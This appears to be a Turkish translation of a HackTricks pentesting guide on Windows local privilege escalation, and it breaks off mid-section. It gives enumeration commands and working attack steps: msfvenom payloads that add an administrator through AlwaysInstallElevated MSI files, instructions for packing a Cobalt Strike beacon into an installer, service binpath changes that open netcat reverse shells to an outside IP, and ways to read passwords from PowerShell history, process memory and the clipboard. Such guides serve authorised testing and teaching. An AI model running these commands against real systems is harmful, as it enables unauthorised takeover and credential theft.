# Windows Local Privilege Escalation

<details>

<summary><strong>Sıfırdan kahraman olacak şekilde AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

* **Bir siber güvenlik şirketinde mi çalışıyorsunuz? Şirketinizin HackTricks'te reklamını görmek ister misiniz? ya da PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz?** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) **Discord grubuna**]\(https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)\*\* takip edin.\*\*
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile paylaşın.**

</details>

### **Windows yerel ayrıcalık yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Başlangıç ​​Windows Teorisi

### Erişim İzinleri

**Windows Erişim İzinlerini bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACL'ler - DACL'ler/SACL'ler/ACE'ler

**ACL'ler - DACL'ler/SACL'ler/ACE'ler hakkında daha fazla bilgi için aşağıdaki sayfaya bakın:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Bütünlük Seviyeleri

**Windows'ta bütünlük seviyelerini bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okumalısınız:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windows Güvenlik Kontrolleri

Windows'ta **sistemi numaralandırmanızı engelleyebilecek**, yürütülebilir dosyaları çalıştırmanızı veya hatta **etkinliklerinizi tespit etmenizi engelleyebilecek** farklı şeyler bulunmaktadır. Ayrıcalık yükseltme numaralandırmasına başlamadan önce bu **savunma mekanizmalarını** okumalı ve **tüm bu savunmaları** **numaralandırmalısınız**:

{% content-ref url="../authentication-credentials-uac-and-efs/" %}
[authentication-credentials-uac-and-efs](../authentication-credentials-uac-and-efs/)
{% endcontent-ref %}

## Sistem Bilgisi

### Sürüm bilgisi numaralandırma

Windows sürümünün herhangi bir bilinen zafiyeti olup olmadığını kontrol edin (uygulanan yamaları da kontrol edin).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Sürüm Sızıntıları

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik açıkları hakkında detaylı bilgi aramak için kullanışlıdır. Bu veritabanında 4,700'den fazla güvenlik açığı bulunmaktadır, Windows ortamının sunduğu **geniş saldırı yüzeyini** göstermektedir.

**Sistemde**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas, watson gömülüdür)_

**Yerel sistem bilgileriyle**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit Github depoları:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam değişkenlerinde saklanan herhangi bir kimlik bilgisi/önemli bilgi var mı?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```

### PowerShell Geçmişi

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transkript Dosyaları

Bunu nasıl açacağınızı [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

### PowerShell Modül Günlüğü

PowerShell boru hattı yürütmelerinin ayrıntıları kaydedilir, yürütülen komutları, komut çağrılarını ve betik parçalarını kapsar. Bununla birlikte, tam yürütme ayrıntıları ve çıktı sonuçları yakalanmayabilir.

Bunu etkinleştirmek için, belgelerin "Transkript dosyaları" bölümündeki talimatları izleyin ve **"Powershell Transcription"** yerine **"Modül Günlüğü"** seçeneğini tercih edin.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Son 15 etkinliği PowersShell günlüklerinden görüntülemek için şunu yürütebilirsiniz:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Komut Bloğu Günlüğü**

Komut bloğunun yürütülmesine ilişkin tam bir etkinlik ve içerik kaydı tutulur, böylece her kod bloğu çalıştırıldığında belgelenir. Bu süreç, her etkinliğin kapsamlı bir denetim izini korur ve bu da adli bilişim ve kötü niyetli davranışların analizi için değerli olur. Yürütme anında tüm etkinliklerin belgelenmesiyle, işlem hakkında detaylı içgörüler sağlanır.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block için günlük olaylar, Windows Olay Görüntüleyicisi'nde şu yol üzerinde bulunabilir: **Uygulamalar ve Hizmetler Günlükleri > Microsoft > Windows > PowerShell > Operasyonel**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### İnternet Ayarları

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Sürücüler

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Eğer güncellemeler http yerine http**S** kullanılarak istenmiyorsa sistem tehlikeye girebilir.

Aşağıdaki komutu çalıştırarak ağın SSL olmayan WSUS güncellemesi kullandığını kontrol edebilirsiniz:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Eğer şöyle bir yanıt alırsanız:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

Ve eğer `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` değeri `1`'e eşitse.

O zaman, **saldırılabilir**. Eğer son kayıt 0'a eşitse, o zaman WSUS girişi yok sayılacaktır.

Bu zafiyetleri sömürmek için [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)gibi araçları kullanabilirsiniz - Bunlar, 'sahte' güncellemeleri non-SSL WSUS trafiğine enjekte etmek için kullanılan MiTM silahlaştırılmış saldırı betikleridir.

Araştırmayı buradan okuyabilirsiniz:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Tam raporu buradan okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Temelde, bu hata tarafından sömürülen açık şudur:

> Eğer yerel kullanıcı proxy'sini değiştirme yetkimiz varsa ve Windows Güncellemeleri, Internet Explorer'ın ayarlarında yapılandırılan proxy'yi kullanıyorsa, bu durumda [PyWSUS](https://github.com/GoSecure/pywsus)'u yerel olarak çalıştırarak kendi trafiğimizi ele geçirip varlığımızda yükseltilmiş bir kullanıcı olarak kod çalıştırma yetkimiz olacaktır.
>
> Ayrıca, WSUS hizmeti mevcut kullanıcının ayarlarını kullanır ve bu nedenle sertifika deposunu kullanır. WSUS ana bilgisayar adı için kendinden imzalı bir sertifika oluşturursak ve bu sertifikayı mevcut kullanıcının sertifika deposuna eklersek, hem HTTP hem de HTTPS WSUS trafiğini ele geçirebiliriz. WSUS, sertifikada güven ilk kullanımda bir güven üzerine güven türünde doğrulama mekanizmaları uygulamaz. Sunulan sertifika kullanıcı tarafından güvenilirse ve doğru ana bilgisayar adına sahipse, hizmet tarafından kabul edilecektir.

Bu zafiyeti [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracını kullanarak sömürebilirsiniz (özgür bırakıldığında).

## KrbRelayUp

Belirli koşullar altında Windows **alan** ortamlarında bir **yerel ayrıcalık yükseltme** zafiyeti bulunmaktadır. Bu koşullar, **LDAP imzalamanın zorunlu olmadığı,** kullanıcıların **Kaynak Tabanlı Kısıtlanmış Delege (RBCD) yapılandırmasına izin veren** ve kullanıcıların alan içinde bilgisayarlar oluşturabilme yeteneğine sahip olduğu ortamları içerir. Bu **gereksinimlerin** varsayılan ayarlar kullanılarak karşılandığını belirtmek önemlidir.

Sömürüyü [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) adresinde bulabilirsiniz.

Saldırının akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) adresine bakın.

## AlwaysInstallElevated

Eğer bu 2 kayıt **etkinse** (değeri **0x1** ise), herhangi bir ayrıcalığa sahip kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleme** (çalıştırma) yapabilir.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit yük yükleri

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```

Eğer bir meterpreter oturumunuz varsa, bu tekniği otomatikleştirmek için **`exploit/windows/local/always_install_elevated`** modülünü kullanabilirsiniz.

### PowerUP

Yükseltilmiş ayrıcalıklar için bir Windows MSI ikili dosyası oluşturmak için power-up'tan `Write-UserAddMSI` komutunu kullanın. Bu betik, kullanıcı/grup eklemesi için bir kullanıcı arabirimi erişimine ihtiyaç duyan önceden derlenmiş bir MSI yükleyicisi oluşturur:

```
Write-UserAddMSI
```

### MSI Sargısı

Bu araçları kullanarak bir MSI sargısı oluşturmayı öğrenmek için bu kılavuzu okuyun. **Yalnızca** **komut satırlarını** **çalıştırmak** istiyorsanız bir "**.bat**" dosyasını sargılayabilirsiniz.

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### WIX ile MSI Oluşturma

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Visual Studio ile MSI Oluşturma

* Cobalt Strike veya Metasploit ile **yeni bir Windows EXE TCP yükü** oluşturun `C:\privesc\beacon.exe`
* **Visual Studio**'yu açın, **Yeni bir proje oluştur**'u seçin ve arama kutusuna "kurulumcu" yazın. **Kurulum Sihirbazı** projesini seçin ve **İleri**'ye tıklayın.
* Projeye **AlwaysPrivesc** gibi bir ad verin, konum olarak **`C:\privesc`**'yi kullanın, **çözümü ve projeyi aynı dizine yerleştir** seçeneğini işaretleyin ve **Oluştur**'a tıklayın.
* **İleri**'ye tıklayarak devam edin ve 4 adımdan 3'üne (dahil edilecek dosyaları seçme) ulaşana kadar devam edin. **Ekle**'ye tıklayın ve oluşturduğunuz Beacon yükünü seçin. Ardından **Bitir**'e tıklayın.
* **Çözüm Gezgini**'nde **AlwaysPrivesc** projesini vurgulayın ve **Özellikler**'de **Hedef Platform**'u **x86** yerine **x64** olarak değiştirin.
* Kurulan uygulamayı daha gerçekçi gösterebilecek **Yazar** ve **Üretici** gibi diğer özellikleri değiştirebilirsiniz.
* Projeye sağ tıklayın ve **Görünüm > Özel Eylemler**'i seçin.
* **Yükle**'ye sağ tıklayın ve **Özel Eylem Ekle**'yi seçin.
* **Uygulama Klasörü**ne çift tıklayın, **beacon.exe** dosyanızı seçin ve **Tamam**'a tıklayın. Bu, kurulumcu çalıştırıldığında beacon yükünün hemen yürütülmesini sağlar.
* **Özel Eylem Özellikleri**'nde **Run64Bit**'i **True** olarak değiştirin.
* Son olarak, **derleyin**.
* \`Dosya 'beacon-tcp.exe', 'x86' hedef platformuyla uyumlu değil' uyarısı görüntülenirse, platformu x64 olarak ayarladığınızdan emin olun.

### MSI Kurulumu

Kötücül `.msi` dosyasının **arkaplanda** **kurulumunu** **çalıştırmak** için:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Bu zafiyeti sömürmek için şunu kullanabilirsiniz: _exploit/windows/local/always\_install\_elevated_

## Antivirüs ve Algılayıcılar

### Denetim Ayarları

Bu ayarlar neyin **günlüğe kaydedildiğini** belirler, bu yüzden dikkat etmelisiniz

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, günlüklerin nereye gönderildiğini bilmek açısından ilginçtir.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS**, yerel Yönetici şifrelerinin yönetimi için tasarlanmış olup, her şifrenin alan adına katılan bilgisayarlarda **benzersiz, rastgele ve düzenli olarak güncellendiğini** sağlar. Bu şifreler Active Directory içinde güvenli bir şekilde depolanır ve yalnızca ACL'ler aracılığıyla yeterli izinleri verilen kullanıcılar tarafından erişilebilir, böylece yetkilendirildiklerinde yerel yönetici şifrelerini görebilirler.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Eğer etkinse, **düz metin şifreleri LSASS'ta** (Yerel Güvenlik Otoritesi Alt Sistemi Hizmeti) depolanır.\
[**WDigest hakkında daha fazla bilgi için bu sayfaya bakın**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Koruma

**Windows 8.1** ile başlayarak, Microsoft, yerel güvenlik otoritesi (LSA) için geliştirilmiş koruma sağladı, bu da güvenliği daha da artırarak güvenilmeyen işlemlerin belleğini okuma veya kod enjekte etme girişimlerini **engellemektedir**.\
[**LSA Koruma hakkında daha fazla bilgi için buraya tıklayın**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Kimlik Bilgileri Koruması

**Kimlik Bilgileri Koruması**, **Windows 10**'da tanıtıldı. Amacı, bir cihazda depolanan kimlik bilgilerini, geçiş yapılabilir hash saldırıları gibi tehditlere karşı korumaktır.| [**Kimlik Bilgileri Koruması hakkında daha fazla bilgi için buraya tıklayın.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Önbelleğe Alınmış Kimlik Bilgileri

**Alan kimlik bilgileri**, işletim sistemi bileşenleri tarafından doğrulanan ve **Yerel Güvenlik Otoritesi** (LSA) tarafından kullanılan kimlik bilgileridir. Bir kullanıcının oturum açma verileri bir kayıtlı güvenlik paketi tarafından doğrulandığında, genellikle kullanıcı için alan kimlik bilgileri oluşturulur.\
[**Önbelleğe Alınmış Kimlik Bilgileri hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Sıralama

İlgili izinlere sahip olabileceğiniz grupları kontrol etmelisiniz

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Ayrıcalıklı gruplar

Eğer **bir ayrıcalıklı gruba ait iseniz ayrıcalıkları yükseltebilirsiniz**. Ayrıcalıklı gruplar hakkında bilgi edinin ve ayrıcalıkları yükseltmek için nasıl kötüye kullanabileceğinizi buradan öğrenin:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Token manipülasyonu

Bir **token**'ın ne olduğu hakkında daha fazla bilgi edinin bu sayfada: [**Windows Tokens**](../authentication-credentials-uac-and-efs/#access-tokens).\
**İlginç tokenlar hakkında ve onları nasıl kötüye kullanabileceğiniz hakkında bilgi edinmek için** aşağıdaki sayfayı kontrol edin:

{% content-ref url="privilege-escalation-abusing-tokens.md" %}
[privilege-escalation-abusing-tokens.md](privilege-escalation-abusing-tokens.md)
{% endcontent-ref %}

### Giriş yapmış kullanıcılar / Oturumlar

```bash
qwinsta
klist sessions
```

### Ev klasörleri

```powershell
dir C:\Users
Get-ChildItem C:\Users
```

### Şifre Politikası

```bash
net accounts
```

### Panonun içeriğini al

```plaintext
Bu saldırı, bir kullanıcının panosundaki verileri çalmak için kullanılabilir. Bu veriler genellikle hassas bilgiler içerebilir, bu nedenle bu saldırı türü dikkatle kullanılmalıdır.
```

```bash
powershell -command "Get-Clipboard"
```

## Çalışan İşlemler

### Dosya ve Klasör İzinleri

İlk olarak, işlemleri listele ve işlemin komut satırında **parolaları kontrol et**.\
**Çalışan bazı ikili dosyaları üzerine yazabilir** veya olası [**DLL Kaçırma saldırılarını**](dll-hijacking/) sömürmek için ikili dosyanın klasörüne yazma izinlerinizin olup olmadığını kontrol edin:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Her zaman çalışan olası **electron/cef/chromium hata ayıklayıcılarını** kontrol edin, ayrıcalıkları yükseltmek için kötüye kullanabilirsiniz.

**İşlem ikili dosyalarının izinlerini kontrol etme**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```

**İşlem ikili dosyalarının klasörlerinin izinlerini kontrol etme (DLL Hijacking)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Bellek Şifre Madenciliği

**Sysinternals**'den **procdump** kullanarak çalışan bir işlemin bellek dökümünü oluşturabilirsiniz. FTP gibi hizmetlerde **şifreler açık metin olarak bellekte** bulunur, belleği dökerek şifreleri okumaya çalışın.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Güvensiz GUI uygulamaları

**SISTEM olarak çalışan uygulamalar, bir kullanıcının CMD başlatmasına veya dizinleri gezmesine izin verebilir.**

Örnek: "Windows Yardım ve Destek" (Windows + F1), "komut istemi" arayın, "Komut İstemi'ni Açmak İçin Tıklayın" üzerine tıklayın

## Hizmetler

Hizmet listesini al:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### İzinler

Bir hizmetin bilgilerini almak için **sc** komutunu kullanabilirsiniz.

```bash
sc qc <service_name>
```

Önerilen, her bir servis için gerekli ayrıcalık seviyesini kontrol etmek için _Sysinternals_ 'den **accesschk** ikilisine sahip olmaktır.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Önerilen, "Authenticated Users"ın herhangi bir hizmeti değiştirip değiştiremeyeceğini kontrol etmektir:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP için accesschk.exe'yi buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Hizmeti Etkinleştir

Eğer bu hatayla karşılaşıyorsanız (örneğin SSDPSRV ile):

_1058 sistem hatası oluştu._\
_Hizmet başlatılamıyor, ya devre dışı bırakıldı ya da ona bağlı etkin cihazlar yok._

Etkinleştirebilirsiniz:

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**SSDPSRV'nin çalışması için upnphost hizmetinin (XP SP1 için) bağımlı olduğunu unutmayın.**

Bu sorunun **başka bir çözümü** şudur:

```
sc.exe config usosvc start= auto
```

### **Hizmet ikili yolu değiştirme**

"Kimlik doğrulama yapılmış kullanıcılar" grubunun bir hizmet üzerinde **SERVICE\_ALL\_ACCESS** yetkisine sahip olduğu senaryoda, hizmetin yürütülebilir ikilisinin değiştirilmesi mümkündür. **sc**'yi değiştirmek ve yürütmek için:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Servisi yeniden başlat

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Ayrıcalıklar çeşitli izinler aracılığıyla yükseltilebilir:

* **SERVICE\_CHANGE\_CONFIG**: Hizmet ikili yapılandırmasına izin verir.
* **WRITE\_DAC**: İzin yeniden yapılandırma imkanı sağlar, bu da hizmet yapılandırmalarını değiştirme yeteneğine yol açar.
* **WRITE\_OWNER**: Sahiplik edinme ve izin yeniden yapılandırma izni verir.
* **GENERIC\_WRITE**: Hizmet yapılandırmalarını değiştirme yeteneğini devralır.
* **GENERIC\_ALL**: Ayrıca hizmet yapılandırmalarını değiştirme yeteneğini devralır.

Bu zafiyetin tespiti ve istismarı için _exploit/windows/local/service\_permissions_ kullanılabilir.

### Hizmet ikilileri zayıf izinler

**Hizmet tarafından yürütülen ikili dosyayı değiştirip değiştiremeyeceğinizi** veya ikili dosyanın bulunduğu klasörde **yazma izinlerinizin olup olmadığını** kontrol edin ([**DLL Hijacking**](dll-hijacking/))**.**\
Hizmet tarafından yürütülen her ikili dosyayı **wmic** kullanarak (system32'de değil) alabilir ve izinlerinizi **icacls** kullanarak kontrol edebilirsiniz:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Ayrıca **sc** ve **icacls** kullanabilirsiniz:

```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

### Hizmetler kayıt defteri değiştirme izinleri

Herhangi bir hizmet kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bunu yapmak için aşağıdakileri yapabilirsiniz:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE**'in `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Eğer öyleyse, hizmet tarafından yürütülen ikili dosya değiştirilebilir.

Yürütülen ikili dosyanın Yol'unu değiştirmek için:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Hizmetler kayıt defteri AppendData/AddSubdirectory izinleri

Eğer bir kayıt defteri üzerinde bu izne sahipseniz, bu demektir ki **bu birinden alt kayıt defterleri oluşturabilirsiniz**. Windows hizmetleri durumunda bu, **keyfi kodu yürütmek için yeterlidir:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Tırnak İçermeyen Hizmet Yolları

Eğer bir yürütülebilir dosyanın yolu tırnak içinde değilse, Windows her boşluktan önceki her biti yürütmeye çalışacaktır.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows, şunları yürütmeye çalışacaktır:

```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

### Dahili Windows hizmetlerine ait olmayan tüm tırnak içi olmayan hizmet yollarını listeleyin:

```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Bu zafiyeti** metasploit ile tespit edebilir ve sömürebilirsiniz: `exploit/windows/local/trusted\_service\_path` Metasploit ile manuel olarak bir hizmet ikili oluşturabilirsiniz:

```bash
